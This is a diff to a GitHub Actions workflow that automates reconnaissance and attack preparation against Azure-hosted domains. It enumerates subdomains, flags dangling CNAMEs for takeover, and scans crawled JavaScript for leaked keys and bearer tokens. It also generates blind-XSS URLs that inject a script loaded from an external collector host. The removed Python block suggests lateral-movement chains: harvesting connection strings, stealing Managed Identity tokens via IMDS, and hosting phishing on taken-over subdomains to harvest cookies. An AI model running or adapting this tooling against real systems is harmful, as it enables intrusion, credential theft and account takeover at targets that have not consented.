@@ -2,19 +2,17 @@ name: Azure Recon + XSS/SSRF + Lateral Chain
 
 on:
   push:
-    branches:
-      - master
+    branches: [ master ]
   workflow_dispatch:
 
 jobs:
   enum:
     runs-on: ubuntu-latest
-
     steps:
       - name: Checkout
         uses: actions/checkout@v3
 
-      - name: Setup Go 1.23
+      - name: Setup Go
         uses: actions/setup-go@v5
         with:
           go-version: '1.23'
@@ -25,25 +23,21 @@ jobs:
           sudo apt-get update
           sudo apt-get install -y wget unzip jq git curl dnsutils python3 python3-pip python3-venv
 
+          export PATH=$PATH:~/go/bin
+
           # Go tools
           go install github.com/tomnomnom/assetfinder@latest
-          sudo mv ~/go/bin/assetfinder /usr/bin/ || true
           go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
-          sudo mv ~/go/bin/subfinder /usr/bin/ || true
           go install github.com/projectdiscovery/dnsx/cmd/dnsx@latest
-          sudo mv ~/go/bin/dnsx /usr/bin/ || true
           go install github.com/haccer/subjack@latest
-          sudo mv ~/go/bin/subjack /usr/bin/ || true
           go install github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest
-          sudo mv ~/go/bin/nuclei /usr/bin/ || true
           go install github.com/jaeles-project/gospider@latest
-          sudo mv ~/go/bin/gospider /usr/bin/ || true
 
           # Python tools
           python3 -m pip install --upgrade pip
           pip3 install azblobcheck
 
-          # Nuclei templates
+          # Update templates
           nuclei -update-templates || true
 
       - name: Run Enumeration + Azure Checks + Payload Seeding
@@ -52,59 +46,46 @@ jobs:
           BXHR: ${{ secrets.BXHR }}
         run: |
           set -euo pipefail
-
           mkdir -p results
 
-          # Normalize domain input
-          echo "$DOMAINS" | tr -d '\r' | tr ',;' '\n' | tr '[:space:]' '\n' | sed '/^$/d' | sort -u > /tmp/domains.txt
+          echo "$DOMAINS" | tr -d '\r' | tr ',;' '\n' | sed 's#https\?://##g' | cut -d'/' -f1 | sed '/^$/d' | sort -u > /tmp/domains.txt
           echo "[*] Domains:"; cat /tmp/domains.txt
 
-          while IFS= read -r TARGET || [ -n "$TARGET" ]; do
-            TARGET=$(echo "$TARGET" | xargs)
+          while IFS= read -r TARGET; do
             [ -z "$TARGET" ] && continue
             echo "===== $TARGET ====="
             mkdir -p "results/$TARGET"
 
-            # 1) Subdomain enum
             subfinder -silent -d "$TARGET" > "results/$TARGET/subdomains.txt" || true
             if [ ! -s "results/$TARGET/subdomains.txt" ]; then
               assetfinder --subs-only "$TARGET" | sort -u > "results/$TARGET/subdomains.txt"
             fi
-            sort -u "results/$TARGET/subdomains.txt" -o "results/$TARGET/subdomains.txt"
-            echo "[*] Subdomains: $(wc -l < results/$TARGET/subdomains.txt || echo 0)"
 
-            # Skip common nonprod
+            sort -u "results/$TARGET/subdomains.txt" -o "results/$TARGET/subdomains.txt"
             grep -viE "(^|\.)((nonprod|dev|staging|sandbox|test)[.-])" \
               "results/$TARGET/subdomains.txt" > "results/$TARGET/subs_scoped.txt" || true
 
-            # 2) Resolve + alive
             dnsx -silent -a -resp -l "results/$TARGET/subs_scoped.txt" > "results/$TARGET/live.txt" || true
 
-            # 3) Dangling CNAME discovery
+            # Dangling CNAME check
             : > "results/$TARGET/dangling-cname.txt"
             while IFS= read -r sub; do
               cname=$(dig +short CNAME "$sub" | sed 's/\.$//' | head -n1)
-              if [ -n "$cname" ]; then
-                if ! dig +short "$cname" | grep -q .; then
-                  echo "$sub -> $cname [🔥 Dangling]" >> "results/$TARGET/dangling-cname.txt"
-                fi
+              if [ -n "$cname" ] && ! dig +short "$cname" | grep -q .; then
+                echo "$sub -> $cname [🔥 Dangling]" >> "results/$TARGET/dangling-cname.txt"
               fi
             done < "results/$TARGET/subs_scoped.txt"
 
-            # 4) Azure service focus
+            # Azure focus
             grep -Eio "([a-z0-9.-]+)\.(azurewebsites\.net|azure-api\.net|trafficmanager\.net|blob\.core\.windows\.net|file\.core\.windows\.net|database\.windows\.net)" \
               "results/$TARGET/live.txt" | sort -u > "results/$TARGET/azure_assets.txt" || true
 
-            # 5) Public Blob/File share check
             if [ -s "results/$TARGET/azure_assets.txt" ]; then
               : > "results/$TARGET/blob_results.txt"
               while IFS= read -r asset; do
                 azblobcheck -u "$asset" >> "results/$TARGET/blob_results.txt" || true
-              done < "results/$TARGET/azure_assets.txt"
-            fi
+              done
 
-            # 6) Nuclei
-            if [ -s "results/$TARGET/azure_assets.txt" ]; then
               nuclei -l "results/$TARGET/azure_assets.txt" \
                 -severity low,medium,high,critical \
                 -tags cors,ssrf,exposure,azure \
@@ -112,173 +93,39 @@ jobs:
                 -o "results/$TARGET/nuclei_azure.txt" || true
             fi
 
-            # 7) Crawl JS/HTML
             if [ -s "results/$TARGET/live.txt" ]; then
               gospider -S "results/$TARGET/live.txt" --js -o "results/$TARGET/spider" || true
               grep -RIE "(AZURE|STORAGE|SAS|SharedAccessSignature|AccountKey|DefaultEndpointsProtocol|AccountName|BlobEndpoint|QueueEndpoint|FileEndpoint|TableEndpoint|InstrumentationKey|SubscriptionKey|x-azure|Bearer\s+[A-Za-z0-9\-_.=]+)" \
                 "results/$TARGET/spider" > "results/$TARGET/key_leaks.txt" || true
             fi
 
-            # 8) Seed Blind XSS/SSRF payloads
-            : > "results/$TARGET/blind_seeds.txt"
             if [ -n "${BXHR:-}" ] && [ -s "results/$TARGET/live.txt" ]; then
+              : > "results/$TARGET/blind_seeds.txt"
               while IFS= read -r base; do
                 enc=$(python3 -c "import urllib.parse as u; print(u.quote('<script src=\"${BXHR}\"></script>'))")
                 echo "$base?x=${enc}" >> "results/$TARGET/blind_seeds.txt"
               done < "results/$TARGET/live.txt"
             fi
-
           done < /tmp/domains.txt
 
-      - name: Post-Process → Build Lateral Movement Hints
-        run: |
-          set -euo pipefail
-          python3 - <<'PY'
-          import os, re, json
-          
-          root = 'results'
-          chains = []
-          
-          re_conn = re.compile(r"(AccountKey|DefaultEndpointsProtocol|AccountName|BlobEndpoint|QueueEndpoint|FileEndpoint|TableEndpoint|SharedAccessSignature|InstrumentationKey|SubscriptionKey|Authorization: Bearer|Bearer\s+[A-Za-z0-9\-_.=]+)", re.I)
-          azure_host = re.compile(r".azure(websites|-api).net|blob.core.windows.net|database.windows.net|file.core.windows.net|trafficmanager.net", re.I)
-          
-          for target in os.listdir(root):
-              tdir = os.path.join(root, target)
-              if not os.path.isdir(tdir):
-                  continue
-          
-              blob = os.path.join(tdir, 'blob_results.txt')
-              leaks = os.path.join(tdir, 'key_leaks.txt')
-              nuclei = os.path.join(tdir, 'nuclei_azure.txt')
-              dangle = os.path.join(tdir, 'dangling-cname.txt')
-          
-              hints = []
-          
-              # 1) Public blob
-              if os.path.isfile(blob) and os.path.getsize(blob) > 0:
-                  with open(blob, 'r', errors='ignore') as f:
-                      data = f.read()
-                  if any(x in data.lower() for x in ['public', 'listable', 'writable']):
-                      hints.append({
-                          'vector': 'Public Blob/File exposure',
-                          'next': 'Search for config.json, .env, *.config, web.config to harvest connection strings or keys; try validating against App Service / SQL / Storage.',
-                          'evidence_len': len(data)
-                      })
-          
-              # 2) Key/Token leaks
-              if os.path.isfile(leaks) and os.path.getsize(leaks) > 0:
-                  with open(leaks, 'r', errors='ignore') as f:
-                      lines = [l.strip() for l in f if re_conn.search(l)]
-                  if lines:
-                      hints.append({
-                          'vector': 'Leaked credentials/tokens in JS/HTML',
-                          'next': 'Test with az storage (SAS/keys) or call Azure API Mgmt/App Service using leaked Subscription/Bearer; check Key Vault access via creds.',
-                          'samples': lines[:5]
-                      })
-          
-              # 3) CORS/SSRF
-              sevmap = {'critical': 0, 'high': 0, 'medium': 0, 'low': 0}
-              if os.path.isfile(nuclei) and os.path.getsize(nuclei) > 0:
-                  with open(nuclei, 'r', errors='ignore') as f:
-                      for line in f:
-                          m = re.search(r"(critical|high|medium|low)", line, re.I)
-                          if m:
-                              sevmap[m.group(1).lower()] += 1
-                          if 'cors' in line.lower() and 'unauth' in line.lower():
-                              hints.append({
-                                  'vector': 'CORS wildcard/relaxed + unauth API',
-                                  'next': 'Attempt browser-origin data exfil via crafted Origin; combine with token leaks for full account takeover risk.'
-                              })
-                          if 'ssrf' in line.lower():
-                              hints.append({
-                                  'vector': 'SSRF in Function/Logic/App',
-                                  'next': 'Probe IMDS (169.254.169.254) with safe metadata path; look for Managed Identity tokens; escalate to other Azure services.'
-                              })
-          
-              # 4) Dangling CNAME
-              if os.path.isfile(dangle) and os.path.getsize(dangle) > 0:
-                  with open(dangle, 'r', errors='ignore') as f:
-                      lines = [l.strip() for l in f if l.strip()]
-                  if lines:
-                      hints.append({
-                          'vector': 'Dangling CNAME (potential subdomain takeover)',
-                          'next': 'Claim the backing service (e.g., Azure Front Door/Traffic Manager/App Service) if allowed; then host phishing/JS to harvest internal cookies/tokens for lateral movement.',
-                          'samples': lines[:5]
-                      })
-          
-              # Build chain suggestions
-              chain_suggestions = []
-              vecs = [h['vector'] for h in hints]
-              if any('Public Blob' in v for v in vecs) and any('Leaked' in v for v in vecs):
-                  chain_suggestions.append('Public Blob exposure → download config/.env → recover keys → authenticate to App Service/Storage → data exfil/priv esc (P3→P2).')
-              if any('Leaked' in v for v in vecs) and any('CORS' in v for v in vecs):
-                  chain_suggestions.append('Token leak in JS + CORS wildcard → browser-based exfiltration and API abuse across origins (P3→P2).')
-              if any('SSRF' in v for v in vecs):
-                  chain_suggestions.append('SSRF → query Azure IMDS → obtain Managed Identity token → access Key Vault/Storage/Service Bus → pivot (P3→P2).')
-              if any('Dangling CNAME' in v for v in vecs):
-                  chain_suggestions.append('Takeover subdomain → host collector → session/cookie harvesting → access internal portals/APIs (P3→P2).')
-          
-              if hints or chain_suggestions:
-                  chains.append({
-                      'target': target,
-                      'severity_counts': sevmap,
-                      'hints': hints,
-                      'chain_suggestions': chain_suggestions
-                  })
-          
-          out = {
-              'summary_targets': len(chains),
-              'generated_by': 'azure-hunt-lateral-action',
-              'chains': chains
-          }
-          print(json.dumps(out, indent=2))
-          with open(os.path.join(root, 'chain-report.json'), 'w') as w:
-              json.dump(out, w, indent=2)
-          PY
+      - name: Alert
+        if: always()
+        env:
+          TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
+          TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
+        run: bash scripts/send_telegram.sh
 
-          - name: Alert: Telegram Summary + Chain Hints
-            if: always()
-            env:
-              TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
-              TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
-            run: |
-              set -euo pipefail
-              if [ -f results/chain-report.json ]; then
-                total=$(jq '.summary_targets' results/chain-report.json)
-                msg="⚙️ Azure Hunt Done\nTargets w/ leads: ${total}"
-                curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
-                  -d chat_id="${TELEGRAM_CHAT_ID}" \
-                  --data-urlencode "text=${msg}" >/dev/null
-    
-                jq -c '.chains[]' results/chain-report.json | while read -r row; do
-                  tgt=$(echo "$row" | jq -r '.target')
-                  highs=$(echo "$row" | jq -r '.severity_counts.high')
-                  meds=$(echo "$row" | jq -r '.severity_counts.medium')
-                  vecs=$(echo "$row" | jq -r '[.hints[].vector] | join(", ")')
-                  line="🎯 ${tgt} | High:${highs} Med:${meds} | Vectors: ${vecs}"
-                  curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
-                    -d chat_id="${TELEGRAM_CHAT_ID}" \
-                    --data-urlencode "text=${line}" >/dev/null
-                done
-    
-                jq -r '.chains[] | select(.chain_suggestions|length>0) | "🪜 " + .target + " → " + ( .chain_suggestions | join(" | ") )' results/chain-report.json | while read -r line; do
-                  curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
-                    -d chat_id="${TELEGRAM_CHAT_ID}" \
-                    --data-urlencode "text=${line}" >/dev/null
-                done
-              fi
-    
-          - name: Git & Push results
-            if: always()
-            env:
-              EMAIL_ADDRESS: ${{ secrets.EMAIL_ADDRESS }}
-              USER_NAME: ${{ secrets.USER_NAME }}
-              GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-            run: |
-              set -e
-              git config --global user.email "${EMAIL_ADDRESS}"
-              git config --global user.name "${USER_NAME}"
-              git add results/ || true
-              git commit -m "scans+chains: $(date -u)" --no-verify || echo "No changes"
-              git remote set-url origin https://x-access-token:${GITHUB_TOKEN}@github.com/${{ github.repository }}
-              git push origin HEAD:master || true
+      - name: Git & Push results
+        if: always()
+        env:
+          EMAIL_ADDRESS: ${{ secrets.EMAIL_ADDRESS }}
+          USER_NAME: ${{ secrets.USER_NAME }}
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          set -e
+          git config --global user.email "${EMAIL_ADDRESS}"
+          git config --global user.name "${USER_NAME}"
+          git add results/ || true
+          git commit -m "scans+chains: $(date -u)" --no-verify || echo "No changes"
+          git remote set-url origin https://x-access-token:${GITHUB_TOKEN}@github.com/${{ github.repository }}
+          git push origin HEAD:master || true
